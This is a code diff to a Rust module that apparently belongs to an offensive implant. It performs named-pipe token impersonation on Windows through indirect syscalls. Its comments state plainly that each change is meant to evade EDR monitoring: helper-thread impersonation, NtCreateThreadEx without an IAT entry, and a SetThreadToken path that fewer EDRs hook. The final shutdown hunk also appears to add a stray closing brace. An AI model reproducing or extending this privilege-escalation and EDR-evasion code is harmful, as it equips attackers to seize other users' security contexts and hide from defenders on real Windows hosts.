@@ -17,11 +17,13 @@
 //!    it via `NtSetInformationThread(ThreadImpersonationToken)`.  EDR
 //!    monitoring the main thread sees only `NtSetInformationThread`.
 //!
-//! 2. **SetThreadToken** (preferred): After a pipe client connects, use
-//!    `NtOpenThreadToken` to get the impersonation token set by the pipe
-//!    server, duplicate it with `DuplicateTokenEx`, and call
-//!    `SetThreadToken(NULL, duplicated_token)`.  This is even more direct —
-//!    `SetThreadToken` is a lower-level API that fewer EDRs monitor.
+//! 2. **SetThreadToken** (preferred): A helper thread calls
+//!    `ConnectNamedPipe` + `ImpersonateNamedPipeClient`.  The main thread
+//!    extracts the token via `NtOpenThreadToken` on the helper, duplicates
+//!    it with `NtDuplicateToken`, and applies it via
+//!    `SetThreadToken(NULL, dup)`.  The main thread **never** calls
+//!    `ImpersonateNamedPipeClient`.  `SetThreadToken` is a lower-level API
+//!    that fewer EDRs monitor.
 //!
 //! # Token Cache
 //!
@@ -45,17 +47,18 @@
 use anyhow::{anyhow, Context, Result};
 use std::collections::HashMap;
 use std::sync::{Mutex, OnceLock};
+use std::sync::atomic::{AtomicBool, Ordering};
 use winapi::um::winnt::{
     DUPLICATE_SAME_ACCESS, HANDLE, SECURITY_ATTRIBUTES, TOKEN_ALL_ACCESS, TOKEN_DUPLICATE,
     TOKEN_IMPERSONATE, TOKEN_QUERY, TOKEN_READ, SecurityDelegation, SecurityIdentification,
     SecurityImpersonation, TokenImpersonation, TokenPrimary,
 };
-use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
+use winapi::um::handleapi::INVALID_HANDLE_VALUE;
 use winapi::um::processthreadsapi::{
-    CreateThread, GetCurrentProcess, GetCurrentThread, OpenThreadToken, SetThreadToken,
+    GetCurrentThread, OpenThreadToken, SetThreadToken,
 };
 use winapi::um::securitybaseapi::{DuplicateTokenEx, GetTokenInformation, RevertToSelf};
-use winapi::um::synchapi::WaitForSingleObject;
+// WaitForSingleObject removed — using NtWaitForSingleObject indirect syscall
 use winapi::um::winbase::WAIT_OBJECT_0;
 use winapi::um::winnt::{TOKEN_STATISTICS, TOKEN_TYPE};
 use winapi::shared::minwindef::{DWORD, LPVOID, TRUE};
@@ -152,6 +155,19 @@ impl CachedToken {
     }
 }
 
+impl Drop for CachedToken {
+    fn drop(&mut self) {
+        // Close the token handle to prevent handle leaks.
+        // The handle is a raw HANDLE (pointer) — null or INVALID_HANDLE_VALUE
+        // means it was never opened or already closed.
+        let h = self.handle as usize;
+        if h != 0 && h != usize::MAX {
+            let _ = syscall!("NtClose", h as u64);
+            log::trace!("token_impersonation: Closed cached token handle {h:#x} via Drop");
+        }
+    }
+}
+
 /// Global token cache.  Protected by a Mutex for thread safety.
 static TOKEN_CACHE: Mutex<Option<HashMap<TokenSource, CachedToken>>> = Mutex::new(None);
 
@@ -172,7 +188,7 @@ fn cache_mut() -> std::sync::MutexGuard<'static, Option<HashMap<TokenSource, Cac
 /// This is the core NT API for the token-only approach — fewer EDRs hook this
 /// compared to `ImpersonateNamedPipeClient`.
 unsafe fn nt_set_thread_impersonation_token(thread_handle: HANDLE, token_handle: HANDLE) -> i32 {
-    let target = match nt_syscall::get_syscall_id("NtSetInformationThread") {
+    let target = match crate::syscalls::get_syscall_id("NtSetInformationThread") {
         Ok(t) => t,
         Err(e) => {
             log::error!("token_impersonation: failed to resolve NtSetInformationThread SSN: {e}");
@@ -187,7 +203,7 @@ unsafe fn nt_set_thread_impersonation_token(thread_handle: HANDLE, token_handle:
     //   ThreadInformationLength  // sizeof(HANDLE)
     // )
     let token_value = token_handle as u64;
-    nt_syscall::do_syscall(
+    crate::syscalls::do_syscall(
         target.ssn,
         target.gadget_addr,
         &[
@@ -208,10 +224,10 @@ unsafe fn nt_open_thread_token(
 ) -> Result<HANDLE> {
     let mut token: HANDLE = std::ptr::null_mut();
 
-    let target = nt_syscall::get_syscall_id("NtOpenThreadToken")
+    let target = crate::syscalls::get_syscall_id("NtOpenThreadToken")
         .map_err(|e| anyhow!("failed to resolve NtOpenThreadToken SSN: {e}"))?;
 
-    let status = nt_syscall::do_syscall(
+    let status = crate::syscalls::do_syscall(
         target.ssn,
         target.gadget_addr,
         &[
@@ -236,13 +252,7 @@ fn nt_close_handle(handle: HANDLE) {
     if handle.is_null() || handle as usize == usize::MAX {
         return;
     }
-    if let Ok(target) = nt_syscall::get_syscall_id("NtClose") {
-        let _ = unsafe {
-            nt_syscall::do_syscall(target.ssn, target.gadget_addr, &[handle as u64])
-        };
-    } else {
-        unsafe { CloseHandle(handle) };
-    }
+    let _ = syscall!("NtClose", handle as u64);
 }
 
 /// Call `NtDuplicateToken` via indirect syscall to create a new impersonation
@@ -262,10 +272,10 @@ unsafe fn nt_duplicate_token(
     sqos.ContextTrackingMode = 0;
     sqos.EffectiveOnly = 0;
 
-    let target = nt_syscall::get_syscall_id("NtDuplicateToken")
+    let target = crate::syscalls::get_syscall_id("NtDuplicateToken")
         .map_err(|e| anyhow!("failed to resolve NtDuplicateToken SSN: {e}"))?;
 
-    let status = nt_syscall::do_syscall(
+    let status = crate::syscalls::do_syscall(
         target.ssn,
         target.gadget_addr,
         &[
@@ -378,7 +388,9 @@ fn query_token_user(token: HANDLE) -> Result<(String, String, String)> {
 struct ImpersonationThreadCtx {
     pipe_handle: HANDLE,
     /// Set to true when ImpersonateNamedPipeClient succeeds.
-    success: bool,
+    /// Uses `AtomicBool` with `Ordering::Release`/`Ordering::Acquire` to ensure
+    /// proper memory synchronisation between the helper thread and main thread.
+    success: AtomicBool,
 }
 
 /// Entry point for the impersonation helper thread.  This thread calls
@@ -411,9 +423,10 @@ unsafe extern "system" fn impersonation_thread_entry(param: LPVOID) -> DWORD {
     }
 
     // Signal success — the main thread will extract the token.
-    // We use a raw pointer write here which is safe because the main thread
-    // hasn't read this field yet (it waits for the thread to complete).
-    (*(param as *mut ImpersonationThreadCtx)).success = true;
+    // Use Release ordering to ensure all prior writes (ImpersonateNamedPipeClient
+    // side-effects, pipe state) are visible to the main thread when it loads
+    // with Acquire ordering.
+    (*(param as *mut ImpersonationThreadCtx)).success.store(true, Ordering::Release);
 
     // Keep the impersonation active until the main thread extracts the token.
     // The main thread will terminate this thread via NtClose on the handle.
@@ -462,18 +475,16 @@ pub fn auto_revert_enabled() -> bool {
 /// # Strategy
 ///
 /// 1. Create a named pipe via `CreateNamedPipeA`.
-/// 2. **SetThreadToken path** (preferred): Connect the pipe in the main
-///    thread, call `ImpersonateNamedPipeClient`, immediately extract the
-///    token via `NtOpenThreadToken`, revert the thread, then apply the
-///    duplicated token via `SetThreadToken(NULL, dup)`.  The impersonation
-///    API is called but immediately reverted — EDR monitoring the thread
-///    post-revert sees no active impersonation context.
+/// 2. **SetThreadToken path** (preferred): Spawn a helper thread that
+///    calls `ConnectNamedPipe` + `ImpersonateNamedPipeClient`.  The main
+///    thread extracts the token via `NtOpenThreadToken` on the helper,
+///    duplicates it, then applies via `SetThreadToken(NULL, dup)`.  The
+///    main thread **never** calls `ImpersonateNamedPipeClient`.
 ///
-/// 3. **Impersonation thread path** (fallback): Spawn a helper thread
-///    that calls `ConnectNamedPipe` + `ImpersonateNamedPipeClient`.  The
-///    main thread opens the helper thread's token via `NtOpenThreadToken`,
-///    duplicates it, and applies it via `NtSetInformationThread`.  The
-///    main thread never calls any impersonation API.
+/// 3. **Impersonation thread path** (fallback): Same helper-thread
+///    approach, but applies the token via
+///    `NtSetInformationThread(ThreadImpersonationToken)` instead of
+///    `SetThreadToken`.  Even fewer EDRs hook this NT-native API.
 pub fn impersonate_pipe(pipe_name: &str) -> Result<String> {
     // Determine the full pipe path.
     let full_path = if pipe_name.starts_with(r"\\.\pipe\") {
@@ -532,40 +543,83 @@ pub fn impersonate_pipe(pipe_name: &str) -> Result<String> {
     result
 }
 
-/// SetThreadToken approach: call `ImpersonateNamedPipeClient` briefly to
-/// extract the token, revert immediately, then apply the duplicated token
-/// via `SetThreadToken(NULL, dup)`.  EDR monitoring post-revert sees no
-/// active impersonation context on the main thread.
+/// SetThreadToken approach: spawn a helper thread that calls
+/// `ConnectNamedPipe` + `ImpersonateNamedPipeClient`, then extract the token
+/// from the helper thread and apply it to the main thread via
+/// `SetThreadToken(NULL, dup)`.
+///
+/// The main thread **never** calls `ImpersonateNamedPipeClient` — EDR
+/// monitoring the main thread sees only `NtOpenThreadToken`, token
+/// duplication, and `SetThreadToken`.
 fn impersonate_pipe_via_set_thread_token(pipe_handle: HANDLE, pipe_path: &str) -> Result<String> {
-    // Wait for a client to connect.
-    let connected = unsafe { ConnectNamedPipe(pipe_handle, std::ptr::null_mut()) };
-    if connected == 0 {
-        let err = unsafe { winapi::um::errhandlingapi::GetLastError() };
-        if err != winapi::um::winerror::ERROR_PIPE_CONNECTED {
-            return Err(anyhow!("ConnectNamedPipe failed: Win32 error {err}"));
+    // Prepare the context for the helper thread.
+    let mut ctx = Box::new(ImpersonationThreadCtx {
+        pipe_handle,
+        success: AtomicBool::new(false),
+    });
+
+    let ctx_ptr = &mut *ctx as *mut ImpersonationThreadCtx as LPVOID;
+
+    // Spawn the helper thread via NtCreateThreadEx (indirect syscall, no IAT entry).
+    let mut thread_handle: usize = 0;
+    let create_status = unsafe {
+        syscall!(
+            "NtCreateThreadEx",
+            &mut thread_handle as *mut _ as u64,
+            0x1FFFFFu64,                         // THREAD_ALL_ACCESS
+            std::ptr::null::<u64>() as u64,
+            (-1isize) as u64,                    // NtCurrentProcess()
+            Some(impersonation_thread_entry) as *const _ as u64,
+            ctx_ptr as u64,
+            0u64,                                // CreateSuspended
+            0u64, 0u64, 0u64,
+            std::ptr::null::<u64>() as u64,
+        )
+    };
+
+    if create_status.is_err() || create_status.unwrap() < 0 || thread_handle == 0 {
+        return Err(anyhow!("NtCreateThreadEx failed for impersonation helper (SetThreadToken path)"));
+    }
+
+    // Wait for the helper thread to complete via NtWaitForSingleObject.
+    let timeout_100ns: i64 = -((PIPE_TIMEOUT_MS as i64) * 10_000);
+    let wait_result = unsafe {
+        let status = syscall!(
+            "NtWaitForSingleObject",
+            thread_handle as u64,
+            0u64,
+            &timeout_100ns as *const _ as u64,
+        );
+        if status.is_err() || status.unwrap() < 0 {
+            0xFFFFFFFFu32
+        } else {
+            status.unwrap() as u32
         }
+    };
+    if wait_result != WAIT_OBJECT_0 {
+        let _ = syscall!("NtClose", thread_handle as u64);
+        return Err(anyhow!("impersonation helper thread timed out (SetThreadToken path)"));
     }
 
-    // Briefly impersonate to extract the token.
-    let ok = unsafe { ImpersonateNamedPipeClient(pipe_handle) };
-    if ok == 0 {
-        let err = unsafe { winapi::um::errhandlingapi::GetLastError() };
-        return Err(anyhow!("ImpersonateNamedPipeClient failed: Win32 error {err}"));
+    if !ctx.success.load(Ordering::Acquire) {
+        let _ = syscall!("NtClose", thread_handle as u64);
+        return Err(anyhow!("ImpersonateNamedPipeClient failed in helper thread (SetThreadToken path)"));
     }
 
-    // Extract the impersonation token from our own thread.
+    // Extract the impersonation token from the helper thread via NtOpenThreadToken.
     let token = unsafe {
-        nt_open_thread_token(GetCurrentThread(), TOKEN_ALL_ACCESS, true)
-    }.context("failed to open thread token after impersonation")?;
+        nt_open_thread_token(thread_handle as *mut _, TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, true)
+    }.context("failed to open helper thread token (SetThreadToken path)")?;
 
-    // Immediately revert — minimise the window where the impersonation
-    // is visible on the main thread.
-    unsafe { RevertToSelf() };
-
-    // Duplicate the token into a new impersonation token.
+    // Duplicate the token for our own use.
     let dup_token = unsafe {
         nt_duplicate_token(token, TOKEN_ALL_ACCESS, TokenImpersonation)
-    }.context("failed to duplicate impersonation token")?;
+    }.context("failed to duplicate token from helper thread (SetThreadToken path)")?;
+
+    // Close the original token and the helper thread.
+    nt_close_handle(token);
+    let _ = syscall!("NtClose", thread_handle as u64);
+    drop(ctx);
 
     // Query user/domain from the duplicated token.
     let (user, domain, sid) = query_token_user(dup_token)
@@ -578,12 +632,8 @@ fn impersonate_pipe_via_set_thread_token(pipe_handle: HANDLE, pipe_path: &str) -
     if ok == 0 {
         let err = unsafe { winapi::um::errhandlingapi::GetLastError() };
         nt_close_handle(dup_token);
-        nt_close_handle(token);
         return Err(anyhow!("SetThreadToken failed: Win32 error {err}"));
     }
-
-    // Close the original token — we now use the duplicate.
-    nt_close_handle(token);
 
     // Cache the token.
     let config = CONFIG.get().unwrap();
@@ -623,36 +673,58 @@ fn impersonate_pipe_via_thread(pipe_handle: HANDLE, pipe_path: &str) -> Result<S
     // Prepare the context for the helper thread.
     let mut ctx = Box::new(ImpersonationThreadCtx {
         pipe_handle,
-        success: false,
+        success: AtomicBool::new(false),
     });
 
     let ctx_ptr = &mut *ctx as *mut ImpersonationThreadCtx as LPVOID;
 
     // Spawn the helper thread.
-    let thread_handle = unsafe {
-        CreateThread(
-            std::ptr::null_mut(),
-            0,
-            Some(impersonation_thread_entry),
-            ctx_ptr,
-            0,
-            std::ptr::null_mut(),
+    // Spawn the helper thread via NtCreateThreadEx (indirect syscall, no IAT entry).
+    let mut thread_handle: usize = 0;
+    let create_status = unsafe {
+        syscall!(
+            "NtCreateThreadEx",
+            &mut thread_handle as *mut _ as u64, // ThreadHandle
+            0x1FFFFFu64,                         // DesiredAccess = THREAD_ALL_ACCESS
+            std::ptr::null::<u64>() as u64,      // ObjectAttributes
+            (-1isize) as u64,                    // ProcessHandle = NtCurrentProcess()
+            Some(impersonation_thread_entry) as *const _ as u64, // StartRoutine
+            ctx_ptr as u64,                      // Argument
+            0u64,                                // CreateSuspended
+            0u64,                                // ZeroBits
+            0u64,                                // StackSize
+            0u64,                                // MaxStackSize
+            std::ptr::null::<u64>() as u64,      // AttributeSet
         )
     };
 
-    if thread_handle.is_null() {
-        return Err(anyhow!("CreateThread failed for impersonation helper"));
+    if create_status.is_err() || create_status.unwrap() < 0 || thread_handle == 0 {
+        return Err(anyhow!("NtCreateThreadEx failed for impersonation helper"));
     }
 
     // Wait for the helper thread to complete.
-    let wait_result = unsafe { WaitForSingleObject(thread_handle, PIPE_TIMEOUT_MS) };
+    // Wait for the helper thread via NtWaitForSingleObject (indirect syscall).
+    let timeout_100ns: i64 = -((PIPE_TIMEOUT_MS as i64) * 10_000);
+    let wait_result = unsafe {
+        let status = syscall!(
+            "NtWaitForSingleObject",
+            thread_handle as u64,
+            0u64, // Alertable = FALSE
+            &timeout_100ns as *const _ as u64,
+        );
+        if status.is_err() || status.unwrap() < 0 {
+            0xFFFFFFFFu32 // WAIT_FAILED equivalent
+        } else {
+            status.unwrap() as u32
+        }
+    };
     if wait_result != WAIT_OBJECT_0 {
-        nt_close_handle(thread_handle);
+        let _ = syscall!("NtClose", thread_handle as u64);
         return Err(anyhow!("impersonation helper thread timed out or failed"));
     }
 
-    if !ctx.success {
-        nt_close_handle(thread_handle);
+    if !ctx.success.load(Ordering::Acquire) {
+        let _ = syscall!("NtClose", thread_handle as u64);
         return Err(anyhow!("ImpersonateNamedPipeClient failed in helper thread"));
     }
 
@@ -660,7 +732,7 @@ fn impersonate_pipe_via_thread(pipe_handle: HANDLE, pipe_path: &str) -> Result<S
     // NtOpenThreadToken.  This is an indirect syscall — EDR sees only
     // NtOpenThreadToken, not ImpersonateNamedPipeClient, on the main thread.
     let token = unsafe {
-        nt_open_thread_token(thread_handle, TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, true)
+        nt_open_thread_token(thread_handle as *mut _, TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, true)
     }.context("failed to open helper thread token")?;
 
     // Duplicate the token for our own use.
@@ -670,7 +742,7 @@ fn impersonate_pipe_via_thread(pipe_handle: HANDLE, pipe_path: &str) -> Result<S
 
     // Close the original token and the helper thread.
     nt_close_handle(token);
-    nt_close_handle(thread_handle);
+    let _ = syscall!("NtClose", thread_handle as u64);
     drop(ctx); // Clean up the boxed context.
 
     // Query user/domain.
@@ -741,9 +813,9 @@ pub fn revert_token() -> Result<String> {
     // Passing a NULL token handle removes the impersonation.
     let null_token: u64 = 0;
     let status = unsafe {
-        let target = nt_syscall::get_syscall_id("NtSetInformationThread")
+        let target = crate::syscalls::get_syscall_id("NtSetInformationThread")
             .map_err(|e| anyhow!("failed to resolve NtSetInformationThread SSN: {e}"))?;
-        Ok(nt_syscall::do_syscall(
+        Ok(crate::syscalls::do_syscall(
             target.ssn,
             target.gadget_addr,
             &[
@@ -929,13 +1001,14 @@ pub fn apply_cached_token(source: Option<&TokenSource>) -> Result<()> {
 }
 
 /// Release all cached tokens, closing handles and clearing the cache.
-/// Called during agent shutdown.
+/// Called during agent shutdown.  `CachedToken::Drop` closes each handle.
 pub fn shutdown() {
     let mut guard = cache_mut();
     if let Some(ref mut cache) = *guard {
-        for (_, token) in cache.drain() {
-            nt_close_handle(token.handle);
-        }
+        // drain() drops each CachedToken, which closes the handle via Drop.
+        // No need to call nt_close_handle explicitly — the Drop impl handles it.
+        cache.drain();
+    }
     }
 
     // Revert any active impersonation.
